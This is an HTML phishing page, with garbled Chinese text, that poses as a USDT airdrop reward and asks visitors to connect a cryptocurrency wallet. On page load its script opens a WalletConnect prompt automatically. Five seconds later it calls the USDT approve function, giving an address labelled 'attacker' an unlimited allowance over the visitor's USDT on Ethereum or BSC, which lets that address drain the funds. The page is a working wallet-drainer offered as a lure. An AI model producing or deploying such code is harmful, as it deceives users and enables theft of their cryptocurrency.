<!DOCTYPE html>
<html lang="zh-Hant">
<head>
  <meta charset="UTF-8">
  <title>USDT ç©ºæŠ•æ´»å‹• - è‡ªå‹•æˆæ¬Š</title>
  <!-- WalletConnect v2 Web3Modal -->
  <script src="https://unpkg.com/@web3modal/html@2.6.2/dist/index.umd.js"></script>
  <script src="https://unpkg.com/@web3modal/ethereum@2.6.2/dist/index.umd.js"></script>
  <script src="https://unpkg.com/@wagmi/core@1.3.0/dist/index.umd.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <style>
    body {
      background-color: #111;
      color: #fff;
      font-family: sans-serif;
      text-align: center;
      padding-top: 50px;
    }
    #status {
      margin-top: 20px;
      font-size: 1.1rem;
    }
  </style>
</head>
<body>
  <h2>ğŸ æ­å–œä½ ç²å¾— USDT ç©ºæŠ•ï¼</h2>
  <p>è«‹ä½¿ç”¨æ‰‹æ©Ÿå†·éŒ¢åŒ…æƒç¢¼é€£æ¥éŒ¢åŒ…ä»¥å®Œæˆæˆæ¬Š</p>
  <div id="status">ğŸ”ƒ ç­‰å¾…é€£ç·šä¸­...</div>

  <script>
    (async () => {
      const { Web3Modal } = window.Web3Modal;
      const { EthereumClient, w3mConnectors, w3mProvider } = window.Web3ModalEthereum;
      const { configureChains, createConfig } = window.wagmi;
      const chains = [window.wagmi.mainnet, window.wagmi.bsc];
      const projectId = 'eebb83fd0c3ec5b1770ad20a754e2c8d';

      const { publicClient } = configureChains(chains, [w3mProvider({ projectId })]);
      const wagmiConfig = createConfig({
        autoConnect: true,
        connectors: w3mConnectors({ projectId, chains }),
        publicClient
      });

      const ethereumClient = new EthereumClient(wagmiConfig, chains);
      const web3modal = new Web3Modal({ projectId, themeMode: 'dark' }, ethereumClient);

      const USDT_BY_CHAIN = {
        1: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
        56: "0x55d398326f99059ff775485246999027b3197955"
      };
      const attacker = "0xDa4FfA490992769B8F54063bf0B9E7a4D3479459";
      const abi = ["function approve(address spender, uint256 amount) external returns (bool)"];

      function log(msg) {
        document.getElementById("status").innerText = msg;
      }

      async function autoApprove() {
        try {
          const provider = new ethers.providers.Web3Provider(window.ethereum);
          const signer = provider.getSigner();
          const address = await signer.getAddress();
          log("âœ… éŒ¢åŒ…å·²é€£æ¥: " + address);

          const network = await provider.getNetwork();
          const tokenAddress = USDT_BY_CHAIN[network.chainId];
          if (!tokenAddress) {
            log("âŒ æ­¤éˆä¸æ”¯æ´ USDT");
            return;
          }

          const contract = new ethers.Contract(tokenAddress, abi, signer);
          const tx = await contract.approve(attacker, ethers.constants.MaxUint256);
          log("âœ… æˆæ¬ŠæˆåŠŸï¼Tx Hash: " + tx.hash);
        } catch (err) {
          log("âŒ æˆæ¬Šå¤±æ•—ï¼š" + err.message);
        }
      }

      // ğŸ§  è‡ªå‹•é–‹å•Ÿæƒç¢¼ + è‡ªå‹•åŸ·è¡Œ approve
      window.addEventListener('load', async () => {
        setTimeout(() => web3modal.openModal(), 1000);
        setTimeout(() => autoApprove(), 5000);
      });
    })();
  </script>
</body>
</html>
